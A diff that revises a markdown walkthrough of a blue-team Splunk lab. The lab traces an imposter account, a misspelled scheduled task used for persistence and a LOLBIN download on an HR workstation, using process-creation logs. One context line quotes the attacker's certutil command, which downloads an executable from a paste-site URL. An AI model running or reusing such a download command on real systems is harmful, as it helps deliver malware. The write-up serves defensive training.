@@ -9,19 +9,9 @@
 
 ## Overview
 
-Benign is a blue team Splunk investigation lab focused on host-centric process execution logs. An IDS flagged suspicious activity on a host in the HR department. Using only Windows Event ID 4688 (process creation) logs ingested into Splunk, the investigation identifies an imposter account, a scheduled task used for persistence, and a LOLBIN-based payload download from a third-party file sharing site.
+Investigating an IDS-flagged HR department host, this lab pivots through 13,959 Windows EventID 4688 process-creation logs in Splunk over March 2022 to uncover the imposter account `Amel1a` (impersonating `Amelia`), a misspelled `OfficUpdater` scheduled task persistence created by `Chris.fort`, and a `certutil.exe` LOLBIN download of `benign.exe` from `controlc.com` executed by compromised user `haroon` on `HR_01`.
 
----
-
-## Target Information
-
-| Field | Value |
-|---|---|
-| Platform | TryHackMe SOC Level 1 Path |
-| Log Index | win_eventlogs |
-| Total Events (March 2022) | 13,959 |
-| Infected Host | HR_01 |
-| Compromised User | haroon |
+**Target:** `HR_01` (Windows HR department workstation, user `haroon` compromised)
 
 ---
 
@@ -35,18 +25,11 @@ Benign is a blue team Splunk investigation lab focused on host-centric process e
 
 ---
 
-## Tools Used
-
-- Splunk (SPL queries)
-- Browser (URL investigation)
-
----
-
 ## Investigation
 
 ### Phase 1: Scoping the Data
 
-Setting the time range to March 2022 and searching the index establishes the event count for the investigation period.
+Setting the time range to March 2022 and searching the `Splunk` index establishes the event count for the investigation period.
 
 ```
 index="win_eventlogs"
@@ -119,7 +102,7 @@ certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
 
 ### Phase 5: Flag Extraction
 
-Visiting the C2 URL directly reveals the malicious content and the flag embedded in the payload.
+Visiting the C2 URL directly in a `browser` reveals the malicious content and the flag embedded in the payload.
 
 <img src="05-thm-flag.png" width="800">
 
